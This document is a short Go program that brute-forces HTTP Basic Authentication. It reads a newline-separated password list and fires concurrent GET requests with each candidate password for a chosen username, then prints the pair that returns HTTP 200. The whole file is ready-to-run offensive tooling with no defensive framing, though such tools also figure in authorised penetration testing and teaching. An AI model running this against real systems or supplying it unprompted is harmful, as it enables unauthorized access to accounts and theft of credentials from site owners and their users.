package main

import (
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os"
)

func printUsage() {
	fmt.Println(os.Args[0] + ` - Brute force HTTP Basic Auth

Passwords should be separated by newlines.
URL should include protocol prefix.

Usage:
  ` + os.Args[0] + ` <username> <pwlistfile> <url>

Example:
  ` + os.Args[0] + ` admin passwords.txt https://www.test.com
`)
}

func checkArgs() (string, string, string) {
	if len(os.Args) != 4 {
		log.Println("Incorrect number of arguments.")
		printUsage()
		os.Exit(1)
	}

	// Username, Password list filename, URL
	return os.Args[1], os.Args[2], os.Args[3]
}

func testBasicAuth(url, username, password string, doneChannel chan bool) {
	client := &http.Client{}
	request, err := http.NewRequest("GET", url, nil)
	request.SetBasicAuth(username, password)

	response, err := client.Do(request)
	if err != nil {
		log.Fatal(err)
	}
	if response.StatusCode == 200 {
		log.Printf("Success!\nUser: %s\nPassword: %s\n", username, password)
		os.Exit(0)
	}
	doneChannel <- true
}

func main() {
	username, pwListFilename, url := checkArgs()

	// Open password list file
	passwordFile, err := os.Open(pwListFilename)
	if err != nil {
		log.Fatal("Error opening file. ", err)
	}
	defer passwordFile.Close()

	// Default split method is on newline (bufio.ScanLines)
	scanner := bufio.NewScanner(passwordFile)

	doneChannel := make(chan bool)
	numThreads := 0
	maxThreads := 2

	// Check each password against url
	for scanner.Scan() {
		numThreads += 1

		password := scanner.Text()
		go testBasicAuth(url, username, password, doneChannel)

		// If max threads reached, wait for one to finish before continuing
		if numThreads >= maxThreads {
			<-doneChannel
			numThreads -= 1
		}
	}

	// Wait for all threads before repeating and fetching a new batch
	for numThreads > 0 {
		<-doneChannel
		numThreads -= 1
	}
}
